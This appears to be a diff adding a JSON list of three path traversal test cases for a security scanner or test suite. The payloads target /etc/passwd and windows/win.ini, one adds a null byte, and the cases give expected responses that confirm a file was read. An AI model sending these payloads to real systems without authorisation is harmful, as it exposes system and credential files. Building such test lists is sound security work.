@@ -1,0 +1,19 @@
+[
+  {
+    "name": "Basic Unix Path Traversal",
+    "path": "../../../../etc/passwd",
+    "expectedStatus": [200],
+    "expectedPattern": "root:"
+  },
+  {
+    "name": "Basic Windows Path Traversal",
+    "path": "../../../../windows/win.ini",
+    "expectedStatus": [200],
+    "expectedPattern": "\\[fonts\\]"
+  },
+  {
+    "name": "Null Byte Injection",
+    "path": "../../../../etc/passwd%00",
+    "expectedStatus": [200]
+  }
+]
